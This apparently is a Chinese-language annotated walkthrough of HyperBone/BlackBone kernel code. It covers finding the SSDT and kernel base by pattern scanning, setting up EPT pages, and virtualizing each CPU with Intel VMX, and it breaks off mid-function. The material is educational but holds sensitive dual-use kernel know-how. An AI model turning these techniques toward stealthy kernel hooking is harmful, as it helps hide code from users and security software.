PSYSTEM_SERVICE_DESCRIPTOR_TABLE pSSDT = UtilSSDTBase();// 获取SSDT表的基址 PVOID pBase = UtilKernelBase( &amp;size );// 获取内核基址 if (pSSDT &amp;&amp; pBase) &#123; // 对索引进行范围检查 if (index &gt; pSSDT-&gt;NumberOfServices)// 如果索引大于服务数量 return NULL; return (PUCHAR)pSSDT-&gt;ServiceTableBase + (((PLONG)pSSDT-&gt;ServiceTableBase)[index] &gt;&gt; 4);// 返回服务地址，服务表基址+函数地址/16，因为函数地址按照16字节对齐 &#125; return NULL;&#125; 获取SSDT表基地址123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/// &lt;summary&gt;/// Gets SSDT base - KiServiceTable/// &lt;/summary&gt;/// &lt;returns&gt;SSDT base, NULL if not found&lt;/returns&gt;PSYSTEM_SERVICE_DESCRIPTOR_TABLE UtilSSDTBase()&#123; /* NTOS内核是Windows操作系统的核心部分， 负责管理操作系统的基本功能， 如进程管理、内存管理、设备管理、文件系统等。 在NT内核中，大部分的系统服务都是通过系统调用来实现的， 而系统服务描述符表(SSDT)则是记录这些系统服务函数的重要数据结构之一。 如果要在Windows操作系统内核中进行一些工作 ，必须首先得到NTOS内核的基地址。 因为所有的系统组件和模块都是基于内核加载的， 只有获得NTOS内核的基地址，才能找到内核中具体的系统函数、数据结构，以便进行修改和操作。 */ PUCHAR ntosBase = UtilKernelBase( NULL );// 获取NTOS内核的基址 // Already found if (g_SSDT != NULL) return g_SSDT; if (!ntosBase) return NULL; PIMAGE_NT_HEADERS pHdr = RtlImageNtHeader( ntosBase );// 获取NTOS内核的PE头 PIMAGE_SECTION_HEADER pFirstSec = (PIMAGE_SECTION_HEADER)(pHdr + 1);// 获取NTOS内核的第一个节表 for (PIMAGE_SECTION_HEADER pSec = pFirstSec; pSec &lt; pFirstSec + pHdr-&gt;FileHeader.NumberOfSections; pSec++) &#123; // 遍历NTOS内核的所有节表 // Non-paged, non-discardable, readable sections // Probably still not fool-proof enough... if (pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_NOT_PAGED &amp;&amp; pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; !(pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_DISCARDABLE) &amp;&amp; (*(PULONG)pSec-&gt;Name != &#x27;TINI&#x27;) &amp;&amp; (*(PULONG)pSec-&gt;Name != &#x27;EGAP&#x27;)) &#123;// 判断是否为非分页、可执行和非可丢弃的、名称不为INIT和PAGE的代码节表 PVOID pFound = NULL; // KiSystemServiceRepeat pattern 模式序列 UCHAR pattern[] = &quot;\\x4c\\x8d\\x15\\xcc\\xcc\\xcc\\xcc\\x4c\\x8d\\x1d\\xcc\\xcc\\xcc\\xcc\\xf7&quot;; // 模式匹配 NTSTATUS status = UtilSearchPattern( pattern, 0xCC, sizeof( pattern ) - 1, ntosBase + pSec-&gt;VirtualAddress, pSec-&gt;Misc.VirtualSize, &amp;pFound ); if (NT_SUCCESS( status )) &#123; // 找到SSDT表 g_SSDT = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)pFound + *(PULONG)((PUCHAR)pFound + 3) + 7); //DPRINT( &quot;BlackBone: %s: KeSystemServiceDescriptorTable = 0x%p\\n&quot;, CPU_NUM, __FUNCTION__, g_SSDT ); return g_SSDT; &#125; &#125; &#125; return NULL;&#125; 获取NTOS内核基地址1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/// &lt;summary&gt;/// Get ntoskrnl base address/// &lt;/summary&gt;/// &lt;param name=&quot;pSize&quot;&gt;Size of module&lt;/param&gt;/// &lt;returns&gt;Found address, NULL if not found&lt;/returns&gt;PVOID UtilKernelBase( OUT PULONG pSize )&#123; NTSTATUS status = STATUS_SUCCESS; ULONG bytes = 0; PRTL_PROCESS_MODULES pMods = NULL; PVOID checkPtr = NULL; UNICODE_STRING routineName; // Already found if (g_KernelBase != NULL) &#123; if (pSize) *pSize = g_KernelSize; return g_KernelBase; &#125; RtlInitUnicodeString( &amp;routineName, L&quot;NtOpenFile&quot; );// 初始化查找名称 checkPtr = MmGetSystemRoutineAddress( &amp;routineName );// 获取系统函数地址 if (checkPtr == NULL) return NULL; // Protect from UserMode AV // 保护来自用户模式的AV（防止访问冲突） __try &#123; // 查询系统模块信息的缓冲区大小 status = ZwQuerySystemInformation( SystemModuleInformation, 0, bytes, &amp;bytes ); if (bytes == 0) &#123; DPRINT( &quot;BlackBone: %s: Invalid SystemModuleInformation size\\n&quot;, CPU_IDX, __FUNCTION__ ); return NULL; &#125; // 分配缓冲区 pMods = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag( NonPagedPoolNx, bytes, HB_POOL_TAG ); // 清空缓冲区 RtlZeroMemory( pMods, bytes ); // 获取系统模块信息 status = ZwQuerySystemInformation( SystemModuleInformation, pMods, bytes, &amp;bytes ); if (NT_SUCCESS( status )) &#123; // 模块的信息 PRTL_PROCESS_MODULE_INFORMATION pMod = pMods-&gt;Modules; for (ULONG i = 0; i &lt; pMods-&gt;NumberOfModules; i++) &#123; // System routine is inside module if (checkPtr &gt;= pMod[i].ImageBase &amp;&amp; checkPtr &lt; (PVOID)((PUCHAR)pMod[i].ImageBase + pMod[i].ImageSize)) &#123; g_KernelBase = pMod[i].ImageBase;// 找到的内核基址 g_KernelSize = pMod[i].ImageSize;// 找到的内核大小 if (pSize) *pSize = g_KernelSize;// 从参数返回内核大小 break; &#125; &#125; &#125; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; DPRINT( &quot;BlackBone: %s: Exception\\n&quot;, CPU_IDX, __FUNCTION__ ); &#125; if (pMods) ExFreePoolWithTag( pMods, HB_POOL_TAG );// 释放缓冲区 return g_KernelBase;&#125; 对给定区域进行模式匹配123456789101112131415161718192021222324252627282930313233343536373839404142434445/// &lt;summary&gt;/// Search for pattern/// &lt;/summary&gt;/// &lt;param name=&quot;pattern&quot;&gt;Pattern to search for&lt;/param&gt;/// &lt;param name=&quot;wildcard&quot;&gt;Used wildcard&lt;/param&gt;/// &lt;param name=&quot;len&quot;&gt;Pattern length&lt;/param&gt;/// &lt;param name=&quot;base&quot;&gt;Base address for searching&lt;/param&gt;/// &lt;param name=&quot;size&quot;&gt;Address range to search in&lt;/param&gt;/// &lt;param name=&quot;ppFound&quot;&gt;Found location&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;/// 遍历给定内存区域，与指定模式进行字节比较，进行模式匹配NTSTATUS UtilSearchPattern( IN PCUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN const VOID* base, IN ULONG_PTR size, OUT PVOID* ppFound )&#123; NT_ASSERT( ppFound != NULL &amp;&amp; pattern != NULL &amp;&amp; base != NULL );// 断言 if (ppFound == NULL || pattern == NULL || base == NULL) return STATUS_INVALID_PARAMETER; __try &#123; for (ULONG_PTR i = 0; i &lt; size - len; i++) &#123; BOOLEAN found = TRUE; for (ULONG_PTR j = 0; j &lt; len; j++) &#123; if (pattern[j] != wildcard &amp;&amp; pattern[j] != ((PCUCHAR)base)[i + j]) &#123; found = FALSE; break; &#125; &#125; if (found != FALSE) &#123; *ppFound = (PUCHAR)base + i; return STATUS_SUCCESS; &#125; &#125; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; return STATUS_UNHANDLED_EXCEPTION; &#125; return STATUS_NOT_FOUND;&#125; 初始化全局变量12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/// &lt;summary&gt;/// Allocate global data/// &lt;/summary&gt;/// &lt;returns&gt;Allocated data or NULL&lt;/returns&gt;PGLOBAL_DATA AllocGlobalData()&#123; /* VCPU代表虚拟中央处理单元（Virtual Central Processing Unit），也称为逻辑处理器。 它是在虚拟化环境中为虚拟机创建的一种模拟的CPU。 每个虚拟机可以有一个或多个VCPU，它们负责执行虚拟机中的指令和处理计算任务。 EPT代表扩展页面表（Extended Page Table）。 EPT是Intel处理器中的一种硬件技术， 用于虚拟地址到物理地址的转换。在虚拟化环境中，EPT用于管理虚拟机中的内存访问， 实现虚拟机之间和虚拟机与宿主操作系统之间的地址隔离和保护。 EPT表存储了虚拟地址与物理地址之间的映射关系。 Page表示内存页，是计算机系统中内存管理的最小单位。在常见的架构中，一个页面的大小通常为4KB。 内存页被用于分配和管理内存，用于存储程序指令和数据。 在这段代码中，Page指的是用于存储EPT表的一块连续的内存页。 通过预分配这些页面并将页面地址存储在VCPU的EPT.Pages数组中，来管理EPT表的相关信息。 */ PHYSICAL_ADDRESS low = &#123; 0 &#125;, high = &#123; 0 &#125;;// 物理地址 high.QuadPart = MAXULONG64;// 最大的64位ULONG ULONG cpu_count = KeQueryActiveProcessorCountEx( ALL_PROCESSOR_GROUPS );// 当前CPU数量 ULONG_PTR size = FIELD_OFFSET( GLOBAL_DATA, cpu_data ) + cpu_count * sizeof( VCPU );// 计算全局数据结构大小 // 在非分页池中分配内存，大小为size PGLOBAL_DATA pData = (PGLOBAL_DATA)ExAllocatePoolWithTag( NonPagedPoolNx, size, HB_POOL_TAG ); if (pData == NULL) return NULL; RtlZeroMemory( pData, size );// 将分配的内存清零 // 在非分页池中分配内存，大小为一页，存储MSR寄存器位图 pData-&gt;MSRBitmap = ExAllocatePoolWithTag( NonPagedPoolNx, PAGE_SIZE, HB_POOL_TAG ); if (pData-&gt;MSRBitmap == NULL) &#123; // 分配失败，释放空间 ExFreePoolWithTag( pData, HB_POOL_TAG ); return NULL; &#125; RtlZeroMemory( pData-&gt;MSRBitmap, PAGE_SIZE ); // 获取CPU制造商信息 pData-&gt;CPUVendor = UtilCPUVendor(); // 遍历cpu_data数组，对VCPU进行初始化 for (ULONG i = 0; i &lt; cpu_count; i++) &#123; PVCPU Vcpu = &amp;pData-&gt;cpu_data[i]; // 初始化VCPU中的页链表 InitializeListHead( &amp;Vcpu-&gt;EPT.PageList ); // 循环预分配EPT页面 for (ULONG j = 0; j &lt; EPT_PREALLOC_PAGES; j++) &#123; // 分配一个连续页面 Vcpu-&gt;EPT.Pages[j] = MmAllocateContiguousMemorySpecifyCache( PAGE_SIZE, low, high, low, MmNonCached ); if (Vcpu-&gt;EPT.Pages[j] != NULL) &#123; // 设置页面为可读写 UtilProtectNonpagedMemory( Vcpu-&gt;EPT.Pages[j], PAGE_SIZE, PAGE_READWRITE ); RtlZeroMemory( Vcpu-&gt;EPT.Pages[j], PAGE_SIZE ); &#125; &#125; &#125; return pData;&#125; 获取物理内存信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374/// &lt;summary&gt;/// Gather info about used physical pages/// &lt;/summary&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS UtilQueryPhysicalMemory()&#123; if (g_Data-&gt;Memory != NULL) return STATUS_SUCCESS; // 获取物理内存范围信息 PPHYSICAL_MEMORY_RANGE pBaseRange = MmGetPhysicalMemoryRanges(); if (pBaseRange == NULL) return STATUS_UNSUCCESSFUL; // 遍历链表，计算物理内存页面数目pageCount和区域数量runsCount ULONG runsCount = 0, pageCount = 0; for (PPHYSICAL_MEMORY_RANGE pRange = pBaseRange; pRange-&gt;NumberOfBytes.QuadPart != 0; pRange++) &#123; pageCount += (ULONG)PFN( pRange-&gt;NumberOfBytes.QuadPart ); runsCount++; &#125; /* APIC（Advanced Programmable Interrupt Controller）是一种高级可编程中断控制器，用于处理中断和异常。 它是一种在计算机体系结构中实现中断控制的硬件设备。 在多核处理器系统中，每个核心都有自己的本地 APIC。本地 APIC 负责接收和处理与该核心相关的中断，并将其分发给适当的处理器。 此外，还有一个 I/O APIC，负责管理外部设备的中断信号以及将它们分发给适当的处理器。 APIC 提供了一种灵活和可扩展的方式来管理和处理中断，使得系统能够高效地响应各种设备和事件引起的中断请求。 它支持优先级、屏蔽、中断分发和处理、中断共享等功能，能够提高系统的可靠性和性能。 APIC 物理页是指用于存储 APIC 相关数据结构的物理内存页。在x86 架构的计算机系统中， APIC 物理页通常位于物理内存的固定地址上， 并用于存储本地 APIC、I/O APIC 和其他与 APIC 相关的寄存器和数据结构。 */ // 获取APIC物理页信息 IA32_APIC_BASE apic = &#123; 0 &#125;; apic.All = __readmsr( MSR_APIC_BASE );// IA32_APIC_BASE寄存器的值 runsCount += 2;// 添加到 runsCount 中 // 计算Memory需要的大小，并为全局变量分配内存 ULONG size = sizeof( PPHYSICAL_MEMORY_DESCRIPTOR ) + runsCount * sizeof( PHYSICAL_MEMORY_RUN ); g_Data-&gt;Memory = ExAllocatePoolWithTag( NonPagedPoolNx, size, HB_POOL_TAG ); if (g_Data-&gt;Memory != NULL) &#123; RtlZeroMemory( g_Data-&gt;Memory, size ); // 将物理内存范围信息复制到全局变量中，设置每个范围的起始页和页面数目 g_Data-&gt;Memory-&gt;NumberOfPages = pageCount; g_Data-&gt;Memory-&gt;NumberOfRuns = runsCount; runsCount = 0; for (PPHYSICAL_MEMORY_RANGE pRange = pBaseRange; pRange-&gt;BaseAddress.QuadPart != 0; pRange++, runsCount++) &#123; g_Data-&gt;Memory-&gt;Run[runsCount].BasePage = PFN( pRange-&gt;BaseAddress.QuadPart ); g_Data-&gt;Memory-&gt;Run[runsCount].PageCount = PFN( pRange-&gt;NumberOfBytes.QuadPart ); &#125; // 添加用于存储APIC的单个页 g_Data-&gt;Memory-&gt;Run[runsCount].BasePage = apic.Fields.Apic_base; g_Data-&gt;Memory-&gt;Run[runsCount].PageCount = 1; // 添加从0xF0000000共计0x10000页面的保留页 g_Data-&gt;Memory-&gt;Run[runsCount + 1].BasePage = PFN( 0xF0000000 ); g_Data-&gt;Memory-&gt;Run[runsCount + 1].PageCount = 0x10000; ExFreePool( pBaseRange ); return STATUS_SUCCESS; &#125; ExFreePool( pBaseRange ); return STATUS_UNSUCCESSFUL;&#125; 释放全局变量123456789101112131415161718192021222324252627282930313233343536/// &lt;summary&gt;/// Free global data/// &lt;/summary&gt;/// &lt;param name=&quot;pData&quot;&gt;Data pointer&lt;/param&gt;VOID FreeGlobalData( IN PGLOBAL_DATA pData )&#123; if (pData == NULL) return; // 获取当前系统中活动处理器的数量 ULONG cpu_count = KeQueryActiveProcessorCountEx( ALL_PROCESSOR_GROUPS ); for (ULONG i = 0; i &lt; cpu_count; i++) &#123; //访问Vcpu数组成员，释放VMXON、VMCS、VMMStack和EPT.Pages数据结构内存 PVCPU Vcpu = &amp;pData-&gt;cpu_data[i]; if (Vcpu-&gt;VMXON) MmFreeContiguousMemory( Vcpu-&gt;VMXON ); if (Vcpu-&gt;VMCS) MmFreeContiguousMemory( Vcpu-&gt;VMCS ); if (Vcpu-&gt;VMMStack) MmFreeContiguousMemory( Vcpu-&gt;VMMStack ); for (ULONG j = 0; j &lt; EPT_PREALLOC_PAGES; j++) if (Vcpu-&gt;EPT.Pages[j] != NULL) MmFreeContiguousMemory( Vcpu-&gt;EPT.Pages[j] ); &#125; // 释放物理内存和MSR位图内存 if (pData-&gt;Memory) ExFreePoolWithTag( pData-&gt;Memory, HB_POOL_TAG ); if (pData-&gt;MSRBitmap) ExFreePoolWithTag( pData-&gt;MSRBitmap, HB_POOL_TAG ); // 释放内存池内存 ExFreePoolWithTag( pData, HB_POOL_TAG );&#125; 检查CPU虚拟化特性123456789/// &lt;summary&gt;/// CPU virtualization features/// &lt;/summary&gt;VOID HvmCheckFeatures()&#123; CPU_VENDOR vendor = UtilCPUVendor(); if (vendor == CPU_Intel) VmxCheckFeatures();&#125; 检查并记录相应的CPU虚拟化特性1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/// &lt;summary&gt;/// Check various VMX features: EPT, VPID, VMFUNC, etc./// &lt;/summary&gt;VOID VmxCheckFeatures()&#123; IA32_VMX_BASIC_MSR basic = &#123; 0 &#125;; IA32_VMX_PROCBASED_CTLS_MSR ctl = &#123; 0 &#125;; IA32_VMX_PROCBASED_CTLS2_MSR ctl2 = &#123; 0 &#125;; IA32_VMX_EPT_VPID_CAP_MSR vpidcap = &#123; 0 &#125;; // True MSRs basic.All = __readmsr( MSR_IA32_VMX_BASIC );// 读取MSR_IA32_VMX_BASIC寄存器 g_Data-&gt;Features.TrueMSRs = basic.Fields.VmxCapabilityHint;// 检查硬件直接提供的真实MSR // Secondary control ctl.All = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS ); g_Data-&gt;Features.SecondaryControls = ctl.Fields.ActivateSecondaryControl;// 检查是否支持次级控制 /* Secondary control（次级控制）是指在虚拟化环境中， 用于控制虚拟机对处理器部分功能的访问和使用的一组寄存器或设置。 在虚拟化技术中，虚拟机监视器（VMM）负责管理和控制虚拟机，包括对处理器的访问和配置。 为了实现安全的虚拟化环境，处理器提供了一些特殊的次级控制寄存器或标志位， 用于限制虚拟机的某些操作或行为，以防止虚拟机绕过VMM直接访问处理器的敏感功能或破坏虚拟化隔离。 */ if (ctl.Fields.ActivateSecondaryControl) &#123; //检查 EPT, VPID, VMFUNC /* EPT（Extended Page Tables）：EPT是Intel VT-x虚拟化技术中的一项功能， 它允许在虚拟机监控程序（VMM）和虚拟机（VM）之间进行内存管理。 EPT使用了额外的页表层级，将虚拟地址转换为物理地址，并提供了更高效的内存虚拟化支持。 EPT可以提高虚拟机的性能和隔离性。 VPID（Virtual Processor Identifier）：VPID是Intel VT-x虚拟化技术中的一个特性， 用于改进虚拟机切换时的TLB（Translation Lookaside Buffer）缓存效率。 每个虚拟机都被分配一个唯一的VPID，当虚拟机切换时，可以保留TLB中与新虚拟机关联的页表条目， 加速虚拟机的上下文切换。 VMFUNC（VM Functions）：VMFUNC是Intel VT-x虚拟化技术中的一项功能， 它允许虚拟机中的代码调用一些特殊的处理器功能。 通过VMFUNC，虚拟机可以执行一些特权指令，包括对虚拟化扩展的访问控制、访问虚拟机控制结构等。 VMFUNC使得虚拟化软件可以更加灵活地扩展和控制虚拟机的功能。 */ ctl2.All = __readmsr( MSR_IA32_VMX_PROCBASED_CTLS2 ); g_Data-&gt;Features.EPT = ctl2.Fields.EnableEPT; g_Data-&gt;Features.VPID = ctl2.Fields.EnableVPID; g_Data-&gt;Features.VMFUNC = ctl2.Fields.EnableVMFunctions; if (ctl2.Fields.EnableEPT != 0) &#123; // Execute only vpidcap.All = __readmsr( MSR_IA32_VMX_EPT_VPID_CAP ); g_Data-&gt;Features.ExecOnlyEPT = vpidcap.Fields.ExecuteOnly; g_Data-&gt;Features.InvSingleAddress = vpidcap.Fields.IndividualAddressInvVpid; if (vpidcap.Fields.ExecuteOnly == 0) DPRINT( &quot;HyperBone: CPU %d: %s: No execute-only EPT translation support\\n&quot;, CPU_IDX, __FUNCTION__ ); &#125; else DPRINT( &quot;HyperBone: CPU %d: %s: No EPT/VPID support\\n&quot;, CPU_IDX, __FUNCTION__ ); &#125; else DPRINT( &quot;HyperBone: CPU %d: %s: No secondary contol support\\n&quot;, CPU_IDX, __FUNCTION__ );&#125; HVM与VMXVMX代表虚拟机扩展（Virtual Machine Extensions），是Intel处理器提供的硬件虚拟化技术。通过VMX，处理器可以在同一个物理主机上同时运行多个虚拟机，每个虚拟机都能拥有自己的操作系统和应用程序，并且相互之间是隔离的。 HVM代表硬件辅助虚拟化（Hardware-assisted Virtualization），是一种虚拟化技术。它利用处理器中的硬件特性来提高虚拟化的性能和效率。HVM通常与VMX结合使用，以实现更快速、更可靠的虚拟化环境。 简而言之，VMX指的是Intel处理器提供的硬件虚拟化技术，而HVM则是一种利用硬件辅助虚拟化的技术。这两者都是为了实现高效、安全的虚拟化环境而存在的。 开启虚拟化1234567891011121314151617181920212223/// &lt;summary&gt;/// Virtualize each CPU/// &lt;/summary&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS StartHV()&#123; // Unknown CPU if (g_Data-&gt;CPUVendor == CPU_Other) return STATUS_NOT_SUPPORTED;// 不支持 KeGenericCallDpc( HvmpHVCallbackDPC, (PVOID)__readcr3() );// 读取CR3寄存器的值 // Some CPU failed ULONG count = KeQueryActiveProcessorCountEx( ALL_PROCESSOR_GROUPS );// 查询活动处理器的数量 if (count != (ULONG)g_Data-&gt;vcpus)// 活动处理器的数量不等于虚拟处理器的数量 &#123;// 有处理器失败，停止虚拟化并返回失败 DPRINT( &quot;HyperBone: CPU %d: %s: Some CPU failed to subvert\\n&quot;, CPU_IDX, __FUNCTION__ ); StopHV(); return STATUS_UNSUCCESSFUL; &#125; return STATUS_SUCCESS;&#125; DPC回调进行虚拟化处理123456789101112131415161718192021222324252627282930VOID HvmpHVCallbackDPC( PRKDPC Dpc, PVOID Context, PVOID SystemArgument1, PVOID SystemArgument2 )&#123; /* DPC（Deferred Procedure Call）是一种延迟执行的过程调用机制， 用于在计算机系统的中断或系统事件处理过程完成后，延迟执行一些需要高优先级处理的任务或回调函数。 DPC的执行是在系统抢占模式下进行的，因此可以保证其执行的稳定性和一致性。 使用DPC可以实现一些延迟处理的任务，例如缓冲区刷新、资源回收、数据处理等。 通过将这些任务置于DPC中执行，可以避免阻塞正常的中断处理程序或系统服务例程，提高系统的效率和响应性能。 */ UNREFERENCED_PARAMETER( Dpc );// Dpc是一个未使用的参数 PVCPU pVCPU = &amp;g_Data-&gt;cpu_data[CPU_IDX];// 获取当前处理器的虚拟处理器 // Check if we are loading, or unloading if (ARGUMENT_PRESENT( Context ))// 检测Context是否被传递，通过Context参数判断是加载还是卸载 &#123; // 执行对应的初始化操作 g_Data-&gt;CPUVendor == CPU_Intel ? IntelSubvertCPU( pVCPU, Context ) : AMDSubvertCPU( pVCPU, Context ); &#125; else &#123; // 恢复虚拟处理器 g_Data-&gt;CPUVendor == CPU_Intel ? IntelRestoreCPU( pVCPU ) : AMDRestoreCPU( pVCPU ); &#125; // 等待所有DPC同步，传入同步信号量 KeSignalCallDpcSynchronize( SystemArgument2 ); // 标记DPC执行完成，传入完成信号量 KeSignalCallDpcDone( SystemArgument1 );&#125; 初始化IntelCPU123456// HVM.c// Vendor-specific callsinline VOID IntelSubvertCPU( IN PVCPU Vcpu, IN PVOID SystemDirectoryTableBase )&#123; VmxInitializeCPU( Vcpu, (ULONG64)SystemDirectoryTableBase );&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091// VMX.c/// &lt;summary&gt;/// Virtualize LP 初始化逻辑处理器/// &lt;/summary&gt;/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;/// &lt;param name=&quot;SystemDirectoryTableBase&quot;&gt;Kernel CR3&lt;/param&gt;VOID VmxInitializeCPU( IN PVCPU Vcpu, IN ULONG64 SystemDirectoryTableBase )&#123; /* 存储处理器的休眠状态，其中包含所有特殊寄存器和MSR（模型特定寄存器）， VMCS（虚拟机控制结构）将需要这些作为其设置的一部分。这样可以避免使用汇编序列 并手动读取这些数据。 */ /* KeSaveStateForHibernate是Windows内核函数，用于保存处理器的状态以进行休眠操作。 在Windows系统中，当计算机进入休眠状态时，操作系统需要保存处理器的当前状态， 包括寄存器、程序计数器（指令指针）以及其他关键的执行上下文信息。 这样，在计算机重新唤醒时，系统可以从先前保存的状态中恢复，并继续执行之前的操作。 KeSaveStateForHibernate函数的作用就是将当前处理器的状态保存到内存中， 以便后续的休眠操作使用。它会将所有的特殊寄存器、模型特定寄存器、以及一般寄存器的值保存起来， 确保在休眠期间数据不会丢失。具体而言，该函数会将处理器状态保存到与休眠操作相关的数据结构中。 这个函数通常由操作系统内核在准备进入休眠状态之前调用，以便将当前的处理器状态保存下来。 然后，在计算机唤醒时，操作系统可以使用相应的函数来还原保存的状态，以实现无缝的恢复。 */ KeSaveStateForHibernate( &amp;Vcpu-&gt;HostState );// 启动之前确保可以保存现有处理器状态，确保在虚拟化期间数据不会丢失 /* 捕获整个寄存器状态。因为一旦启动虚拟机，它将从定义的客户机指令指针处开始执行， 该指针会在此调用中被捕获。换句话说，我们将返回到我们的原始位置，但由于VMCS/VMX初始化代码的影响， 我们的寄存器都被破坏了（因为客户机状态不包括寄存器状态）。通过在这里保存上下文， 包括所有通用寄存器，我们保证返回时我们也能恢复我们的起始寄存器值 */ RtlCaptureContext( &amp;Vcpu-&gt;HostState.ContextFrame ); /* 根据上述情况，在这里可以判断虚拟机实际上是否已启动。 我们可以通过验证VmxEnabled字段的值来检查这一点，该字段在执行VMXLAUNCH之前设置为1。 在此函数中，我们不使用Data参数或任何其他局部寄存器，并且事实上VmxEnabled是不确定的， 因为根据上述情况，由于VMCALL本身，我们的寄存器状态当前是脏的。 通过结合全局变量和API调用使用它，我们还确保编译器不会以任何方式优化此访问， 即使在LTGC/Ox构建上也是如此。 */ if (g_Data-&gt;cpu_data[CPU_IDX].VmxState == VMX_STATE_TRANSITION) &#123; /* 表示虚拟机已启动，因此即将将GPR（通用寄存器）还原为其原始值。 这将使我们再次回到上一行代码，但是这次VmxEnabled的值将为2，绕过if和else if检查。 */ g_Data-&gt;cpu_data[CPU_IDX].VmxState = VMX_STATE_ON; /* 最后，恢复上下文，以便最终恢复所有寄存器和堆栈状态。通过继续以这种方式引用每个VP数据， 编译器将继续生成非优化的访问，确保不会破坏先前的寄存器状态。 */ VmRestoreContext( &amp;g_Data-&gt;cpu_data[CPU_IDX].HostState.ContextFrame ); &#125; /* 尚未尝试启动虚拟机，也没有启动它。换句话说， 这是第一次调用VmxInitializeCPU。因此，我们可以自由地使用所有寄存器状态。 */ else if (g_Data-&gt;cpu_data[CPU_IDX].VmxState == VMX_STATE_OFF) &#123; /* 首先，捕获SYSTEM进程的PML4（页目录表）的值，以便无论当前LP中断哪个进程， 所有虚拟处理器都可以共享正确的内核地址空间。 */ /* 在x86-64架构下，操作系统内核和用户进程共享同一个物理地址空间。为了实现这个地址空间共享， x86-64架构定义了一个层次化的虚拟内存地址转换机制，这个机制包括页表、页目录表和页全局目录等数据结构。 其中，页全局目录是整个地址空间的根节点，每个进程都有一个自己的页全局目录。 页目录表用来描述一个进程的用户地址空间， 而具有特殊权限的内核空间也需要一个页目录表来映射内核地址空间。 &quot;捕获SYSTEM进程的PML4（页目录表）的值&quot;， 实际上就是获取当前系统的内核页目录表的物理地址，以便后续的操作可以正确地访问内核的地址空间。 由于LP调度器会将不同进程调度到不同的逻辑处理器上执行， 为了保证多个逻辑处理器之间能够正确地共享内核地址空间， 必须要使所有的虚拟处理器共享同一个内核页目录表。 因此，在运行任意一个进程之前，需要将其对应的页目录表设置为内核页目录表的地址，即代码中所描述的部分。 以保证该进程可以正确地访问内核地址空间。这可以通过在LP上下文切换时， 将当前进程的页目录表设置为系统内核页目录表的物理地址来实现。 */ Vcpu-&gt;SystemDirectoryTableBase = SystemDirectoryTableBase; // 尝试在该处理器上初始化VMX VmxSubvertCPU( Vcpu ); &#125;&#125; 从 CONTEXT 结构体中恢复寄存器上下文12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455VmRestoreContext PROC ; 与RtlCaptureContext()兼容。使用此函数代替RtlRestoreContext()函数，以便在Win10 15063+版本上不会由于RSP检查而导致蓝屏。 push rbp push rsi push rdi sub rsp, 30h mov rbp, rsp movaps xmm0, xmmword ptr [rcx+1A0h] movaps xmm1, xmmword ptr [rcx+1B0h] movaps xmm2, xmmword ptr [rcx+1C0h] movaps xmm3, xmmword ptr [rcx+1D0h] movaps xmm4, xmmword ptr [rcx+1E0h] movaps xmm5, xmmword ptr [rcx+1F0h] movaps xmm6, xmmword ptr [rcx+200h] movaps xmm7, xmmword ptr [rcx+210h] movaps xmm8, xmmword ptr [rcx+220h] movaps xmm9, xmmword ptr [rcx+230h] movaps xmm10, xmmword ptr [rcx+240h] movaps xmm11, xmmword ptr [rcx+250h] movaps xmm12, xmmword ptr [rcx+260h] movaps xmm13, xmmword ptr [rcx+270h] movaps xmm14, xmmword ptr [rcx+280h] movaps xmm15, xmmword ptr [rcx+290h] ldmxcsr dword ptr [rcx+34h] mov ax, [rcx+42h] mov [rsp+20h], ax mov rax, [rcx+98h] ; RSP mov [rsp+18h], rax mov eax, [rcx+44h] mov [rsp+10h], eax mov ax, [rcx+38h] mov [rsp+08h], ax mov rax, [rcx+0F8h] ; RIP mov [rsp+00h], rax ; set RIP as return address (for iretq instruction). mov rax, [rcx+78h] mov rdx, [rcx+88h] mov r8, [rcx+0B8h] mov r9, [rcx+0C0h] mov r10, [rcx+0C8h] mov r11, [rcx+0D0h] cli mov rbx, [rcx+90h] mov rsi, [rcx+0A8h] mov rdi, [rcx+0B0h] mov rbp, [rcx+0A0h] mov r12, [rcx+0D8h] mov r13, [rcx+0E0h] mov r14, [rcx+0E8h] mov r15, [rcx+0F0h] mov rcx, [rcx+80h] iretqVmRestoreContext ENDP 使用Intel虚拟化技术启动虚拟机，创建虚拟CPU123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127/// &lt;summary&gt;/// Execute VMLAUNCH/// &lt;/summary&gt;/// &lt;param name=&quot;Vcpu&quot;&gt;Virtyal CPU data&lt;/param&gt;VOID VmxSubvertCPU( IN PVCPU Vcpu )&#123; PHYSICAL_ADDRESS phys = &#123; 0 &#125;; phys.QuadPart = MAXULONG64; // 初始化所有与VMX相关的MSR，通过读取它们的值来初始化 for (ULONG i = 0; i &lt;= VMX_MSR( MSR_IA32_VMX_VMCS_ENUM ); i++) Vcpu-&gt;MsrData[i].QuadPart = __readmsr( MSR_IA32_VMX_BASIC + i ); // 根据系统支持的功能，初始化次级控制（secondary controls）、真实模型专用寄存器（true MSRs）和VMFUNC // 见VmxCheckFeatures() if (g_Data-&gt;Features.SecondaryControls) Vcpu-&gt;MsrData[VMX_MSR( 